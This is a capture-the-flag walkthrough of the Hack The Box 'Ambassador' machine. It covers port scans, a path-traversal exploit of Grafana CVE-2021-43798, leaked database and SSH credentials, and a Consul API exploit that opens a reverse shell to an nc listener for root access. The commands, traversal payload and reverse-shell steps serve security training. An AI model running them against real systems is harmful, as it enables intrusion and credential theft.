# Hack The Box - Ambassador Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.183
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-10 11:11 EST
Nmap scan report for 10.10.11.183
Host is up (0.19s latency).                                                                                                                                                                                                                                                                                                 
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Feb 2023 16:12:31 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Feb 2023 16:12:01 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, LongPassword, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, InteractiveCliesactions, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x16\x15K?iG?,We\x1FP{G9l*I@b
|_  Auth Plugin Name: caching_sha2_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.c
SF-Port3000-TCP:V=7.92%I=7%D=2/10%Time=63E66CC3%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fr
SF:i,\x2010\x20Feb\x202023\x2016:12:01\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Fri,\x2010\x20Feb\x202023\x2016:12:31\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/10%OT=22%CT=1%CU=33710%PV=Y%DS=2%DC=I%G=Y%TM=63E66D5
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%TS=A)OPS(O1=M539ST11N
OS:W7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539S
OS:T11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=4
OS:0%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.11 seconds

```
We get back `4` open ports:
- Port `22`: running `OpenSSH 8.2p1`
- Port `80`: running `Apache httpd 2.4.41`
- Port `3000`: got `302` redirected to `/login`
- Port `3306`: running `MySQL 8.0.30`

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan to covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ rustscan -a 10.10.11.183 --range 1-65535    
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.183:22
Open 10.10.11.183:80
Open 10.10.11.183:3000
Open 10.10.11.183:3306
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,3000,3306 10.10.11.183

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-10 11:14 EST
Initiating Ping Scan at 11:14
Scanning 10.10.11.183 [2 ports]
Completed Ping Scan at 11:14, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:14
Completed Parallel DNS resolution of 1 host. at 11:14, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:14
Scanning 10.10.11.183 [4 ports]
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 80/tcp on 10.10.11.183
Discovered open port 3000/tcp on 10.10.11.183
Completed Connect Scan at 11:14, 0.19s elapsed (4 total ports)
Nmap scan report for 10.10.11.183
Host is up, received syn-ack (0.19s latency).
Scanned at 2023-02-10 11:14:15 EST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

## Enumeration
Let's Take a look at the web service running on port 80 `http://10.10.11.183/`. it seems like a static web page hosted on port 80.

![amb-1](https://user-images.githubusercontent.com/87711310/218149803-5a8a401b-ee5e-4553-957b-52344fec02e3.png)

The only valuable thing about this site is that it gives me a hint that I can log into the box with the user `developer`. But to log in, Something called `DevOps` should give us the password.

![amb-2](https://user-images.githubusercontent.com/87711310/218149930-2992c674-44cf-4145-a0cd-275d665a22d8.png)

So, keeping it at the back of my mind, I visited port `3000` which redirected me to a `Grafana Login page` on `http://10.10.11.183:3000/login`

![amb-3](https://user-images.githubusercontent.com/87711310/218150178-11ce58df-74a7-43a3-9c8a-36b41b54112d.png)

The Version of Grafana `v8.2.0` (d7f71e9eae). This Grafana version vulnerable to `Unauthorized Arbitrary File Read vulnerability (CVE-2021-43798)`

On googling it, I found this exploit that I used to exploit the Grafana login page.

![amb-4](https://user-images.githubusercontent.com/87711310/218156143-32f0235e-ab53-4fb6-85d7-c2a4f7f155ef.png)


The Exploit could be downloaded using this [GitHub](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git) link.

To run the exploit, you have to save the Grafana URL in targets.txt which locate inside what we downloaded from GitHub using the below command.

```
echo "http://10.10.11.183:3000" > targets.txt
```

After Executing Our Python Script Using python exploit.py command Several types of files were saved along with a secret key dumbed down by the exploit.

```
──(darshan㉿kali)-[~/…/HackTheBox/Linux-Boxes/Ambassador/exploit-grafana-CVE-2021-43798]
└─$ sudo python exploit.py
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )                                                                                                    
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \                                                                                                    
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/                                                                                                    
                @pedrohavay / @acassio22                                                                                                                    
                                                                                                                                                            
? Enter the target list:  targets.txt

========================================

[i] Target: http://10.10.11.183:3000
                                                                                                                                                            
[!] Payload "http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.
                                                                                                                                                            
[i] Analysing files...
                                                                                                                                                            
[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/defaults.ini".
                                                                                                                                                            
[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.ini".
                                                                                                                                                            
[i] File "/etc/passwd" found in server.
[*] File saved in "./http_10_10_11_183_3000/passwd".
                                                                                                                                                            
[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.db".
                                                                                                                                                            
[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_10_10_11_183_3000/cmdline".
                                                                                                                                                            
? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm                                                                                                                        
                                                                                                                                                            
[*] Bye Bye!

```

After a successful attempt of exploit, I was given a `secret key`, and there were also a couple of file in my directory too.

Looking inside the files that were dumped by the exploit, I found a `grafana.ini` file I found the credentials for `admin` user.

![amb-5](https://user-images.githubusercontent.com/87711310/218239670-f6f3b971-4dcf-4c6f-ac53-40ed1ea4c13e.png)

Then, I looked at `grafana.db` to look if there's any other useful information. I used a tool called `DB browser for SQLite` and can be download by using the following command.

```
sudo apt-get install sqlitebrowser
```

And using the following command, you can use the tool

```
sqlitebrowser grafana.db
```

fter Loading `grafana.db` into the DB browser there is a table called `data_source` where we can find the credentials for the MySQL database login.

![amb-6](https://user-images.githubusercontent.com/87711310/218240092-3269d477-5683-4d48-af66-ce62de3b6c54.png)

The credentials were:
```
grafana:dontStandSoCloseToMe63221!
```

Now that there was a MySQL database that is hosted on port `3306`, I decided to log into the database.

```
mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
```

After logging into the database, I enumerated the database to find something juicy. There was an interesting database called `whackywidget` and inside that , there was a table called `users` which contained a `Base64` encoded password for the user `Developer` which was hinted at the start of the challenge on the web-page at port `80`.

```
┌──(darshan㉿kali)-[~/…/Linux-Boxes/Ambassador/exploit-grafana-CVE-2021-43798/http_10_10_11_183_3000]
└─$ mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 46
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.206 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.197 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.196 sec)
```

I decoded the password.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

So, now, I tried to ssh into the machine using `developer's` credentials.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ ssh developer@10.10.11.183                       
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ED25519) to the list of known hosts.
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 11 Feb 2023 04:43:46 AM UTC

  System load:           0.14
  Usage of /:            81.0% of 5.07GB
  Memory usage:          40%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:55dc


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$ whoami
developer
```

Grabbing the user flag.

```
developer@ambassador:~$ pwd
/home/developer
developer@ambassador:~$ ls
snap  user.txt
developer@ambassador:~$ cat user.txt
[REDACTED]
```

## Privilege Escalation
My first step in PrivEsc is to run `linpeas`. So I hosted a python server on my machine wheere the linpeas file lies and used `wget` to transfer it to the victim machine.

But I didnt find anything from `linpeas`

So, next, I started manual enumeration.

`sudo -l` didnt give me anything either.

```
developer@ambassador:/tmp$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on ambassador.
```

Next, I looked at the `crontabs`. nothing there too.

```
developer@ambassador:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```


Then, I looked  inside the `/opt` directory. I found a directory named `my-app` there. Inside the `my-app` directory, There is a directory called `.git`. Then I dig into the git log using the below commands. 

```
developer@ambassador:/tmp$ cd /opt
developer@ambassador:/opt$ ls
consul  my-app
developer@ambassador:/opt$ cd my-app/
developer@ambassador:/opt/my-app$ ls
env  whackywidget
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
```

After running the git log command, I saw there are various git commits and I decided to inspect the changes of the last commit (33a53ef9a207976d5ceceddc41a199558843bf3c) using the below command:

```
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Now, I saw that there was a service called `Consul` being used and it was configured with some security token (bb03b43b-1d81-d62b-24b5-39540ee469b5).

I looked up for an exploit `Consul` and found this [Github exploit](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API).

To get the root shell first you need to start Netcat listener, so I started my netcat listener.

```
nc -lvnp 4444
```

After that, I started a python server to transfer my python exploit to the victim machine using the command `python3 -m http.server 8000`. I Download the python script using `wget http://your_ip:8000/consul-exploit.py`.

Once I ran the exploit, I got a message to check my listener.

```
developer@ambassador:/tmp$ python3 consul-exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.94 --lport 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5

[+] Request sent successfully, check your listener
```

After this message, I checked my listener and I had a root shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.11.183] 60826
bash: cannot set terminal process group (28061): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# whoami
whoami
root
```

Grabbing the `root` flag.

```
root@ambassador:/# cat /root/root.txt
cat /root/root.txt
[REDACTED]
```
